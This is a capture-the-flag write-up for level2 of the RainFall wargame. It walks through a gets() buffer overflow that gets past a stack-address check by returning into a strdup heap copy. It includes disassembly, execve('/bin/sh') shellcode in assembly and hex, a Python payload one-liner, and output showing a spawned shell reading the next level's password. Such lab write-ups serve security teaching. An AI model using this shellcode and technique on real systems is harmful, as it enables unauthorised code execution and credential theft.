First we get a new binary and dissasemble it. First we see that there is a p() function and we shift our attention to that. 
First we see that there is a gets() function, and the size of the offset will be 80 (-0x4c(76) + 4(sizeof ebp) ) but it is also followed by a stack protector:
```
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
   0x080484fb <+39>:    and    $0xb0000000,%eax
   0x08048500 <+44>:    cmp    $0xb0000000,%eax
   0x08048505 <+49>:    jne    0x8048527 <p+83>
   0x08048507 <+51>:    mov    $0x8048620,%eax
   0x0804850c <+56>:    mov    -0xc(%ebp),%edx
   0x0804850f <+59>:    mov    %edx,0x4(%esp)
   0x08048513 <+63>:    mov    %eax,(%esp)
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
   0x0804851b <+71>:    movl   $0x1,(%esp)
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
```
So we are not able to redo the exploit of gets, but at the same time, by the end of the function stdup is being called so we could try using the heap
```
   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:    mov    %eax,(%esp)
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
```
Running ltrace on the binary we can see that regarding of any input we get the same address 
```
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                    = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5pp
)                         = 0xbffff6fc
puts("pp"pp
)                                                            = 3
strdup("pp")                                                          = 0x0804a008
```
That will be the heap address that we have to return to.
So basically what is going to happen is we will overflow the buffer (80 bytes) with the arbitrary code execution, add in the rest of the bytes up to 80 and than add the unfreed address of the strdup.
```
	push SYS_EXECVE ; SYS_EXECVE = 11
	pop eax         ; set SYS_EXECVE to eax

	xor esi, esi    ; clean esi
	push esi        ; esi is zero
	push 0x68732f2f ; push 'hs//'
	push 0x6e69622f ; push 'nib/'

	; execve("/bin//sh/", 0, 0);
	;             ^
	;             |
	;            ebx
	mov ebx, esp

	; execve("/bin//sh/", 0, 0);
	;                     ^
	;                     |
	;                    ecx
	xor ecx, ecx    ; clean ecx

	; execve("/bin//sh/", 0, 0);
	;                        ^
	;                        |
	;                       edx
	mov edx, ecx    ; set zero to edx
	int 0x80        ; syscall execve

$ level2@RainFall:~$ python -c "print '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + 57 * 'X' + '\x08\xa0\x04\x08'" > /tmp/expl

$ level2@RainFall:~$ cat /tmp/expl - | ./level2 
j
X�Rh//shh/bin��1ɉ�XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX�
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
